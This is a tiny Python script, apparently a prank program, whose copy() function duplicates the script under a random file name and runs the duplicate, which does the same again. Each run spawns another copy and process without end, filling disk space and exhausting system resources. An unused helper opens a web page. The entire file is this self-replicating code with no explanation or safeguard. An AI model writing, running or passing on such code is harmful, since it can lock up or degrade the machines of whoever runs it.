import shutil
import os
import random

def web():
    os.system("start \"\" https://google.com")

def copy():
    name=str(random.randrange(999999999999999*999999999))
    sou='s01.py'
    des=f'{name}.py'
    shutil.copy(sou,des)
    cmd= f'python {des}'
    os.system(cmd)

try:
    copy()
except KeyboardInterrupt:
    pass
